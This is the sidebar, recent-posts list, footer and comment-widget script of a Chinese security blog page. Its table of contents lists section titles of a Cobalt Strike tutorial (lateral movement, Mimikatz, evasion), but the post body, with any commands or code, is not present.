class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/micgo520"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#Cobalt-strike%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">Cobalt strike的安装与使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">2.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#beacon%E5%91%BD%E4%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">beacon命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5"><span class="toc-number">4.</span> <span class="toc-text">攻击手段</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">4.1.</span> <span class="toc-text">生成木马</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#HTML-Application"><span class="toc-number">4.2.</span> <span class="toc-text">HTML Application</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99"><span class="toc-number">4.3.</span> <span class="toc-text">克隆网站</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#microsoft-%E5%AE%8F"><span class="toc-number">4.4.</span> <span class="toc-text">microsoft 宏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.5.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-number">4.6.</span> <span class="toc-text">钓鱼邮件</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mimikatz"><span class="toc-number">5.</span> <span class="toc-text">Mimikatz</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSF-%E4%B8%8E-CS-%E7%9A%84%E7%BB%93%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">MSF 与 CS 的结合利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%89%A9%E5%B1%95"><span class="toc-number">8.</span> <span class="toc-text">横向扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9E%9A%E4%B8%BE"><span class="toc-number">8.1.</span> <span class="toc-text">主机枚举</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">8.2.</span> <span class="toc-text">用户枚举</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A0%E9%9C%80%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6"><span class="toc-number">8.3.</span> <span class="toc-text">无需恶意软件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.4.</span> <span class="toc-text">获取信任</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Kerberos-%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.5.</span> <span class="toc-text">Kerberos 票据</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.6.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">8.7.</span> <span class="toc-text">远程代码执行</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%AC%E5%8F%91"><span class="toc-number">9.</span> <span class="toc-text">转发</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81SOCKS-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91"><span class="toc-number">9.1.</span> <span class="toc-text">1、SOCKS 代理转发</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E5%8F%8D%E5%90%91%E8%BD%AC%E5%8F%91"><span class="toc-number">9.2.</span> <span class="toc-text">2、反向转发</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3%E3%80%81%E9%80%9A%E8%BF%87-SSH-%E5%BC%80%E9%80%9A%E9%80%9A%E9%81%93"><span class="toc-number">9.3.</span> <span class="toc-text">3、通过 SSH 开通通道</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#malleable-%E5%91%BD%E4%BB%A4%E5%92%8C%E6%8E%A7%E5%88%B6"><span class="toc-number">10.</span> <span class="toc-text">malleable 命令和控制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%8D%E6%9D%80"><span class="toc-number">11.</span> <span class="toc-text">免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81DKIM%E3%80%81SPF-%E5%92%8C-DMARC"><span class="toc-number">11.1.</span> <span class="toc-text">1、DKIM、SPF 和 DMARC</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6"><span class="toc-number">11.2.</span> <span class="toc-text">2、杀毒软件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87Defender%E6%9F%A5%E6%9D%80"><span class="toc-number">11.3.</span> <span class="toc-text">白名单绕过Defender查杀</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/ctfshow%E2%80%94realworld%E6%B8%97%E9%80%8F%E8%B5%9B/" title="ctfshow——RealWorld渗透赛">ctfshow——RealWorld渗透赛</a><time datetime="2023-04-17T16:00:00.000Z" title="发表于 2023-04-18 00:00:00">2023-04-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E4%B8%80/" title="红日靶场一">红日靶场一</a><time datetime="2023-04-14T16:00:00.000Z" title="发表于 2023-04-15 00:00:00">2023-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E6%B8%97%E9%80%8F/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/" title="ctfshow终极考核">ctfshow终极考核</a><time datetime="2023-04-12T16:00:00.000Z" title="发表于 2023-04-13 00:00:00">2023-04-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(7)/" title="内网渗透体系建设——Kerberos攻击专题">内网渗透体系建设——Kerberos攻击专题</a><time datetime="2023-04-06T16:00:00.000Z" title="发表于 2023-04-07 00:00:00">2023-04-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(6)/" title="内网渗透体系建设——权限维持">内网渗透体系建设——权限维持</a><time datetime="2023-04-04T16:00:00.000Z" title="发表于 2023-04-05 00:00:00">2023-04-05</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By micgo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '2t5fYJ95Y61Dyi4xHc3dWgxl-gzGzoHsz',
      appKey: 'UNfGz5zfJGeNX6LS5OyiymLm',
      avatar: 'monsterid',
      serverURLs: 'https://2t5fyj95.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>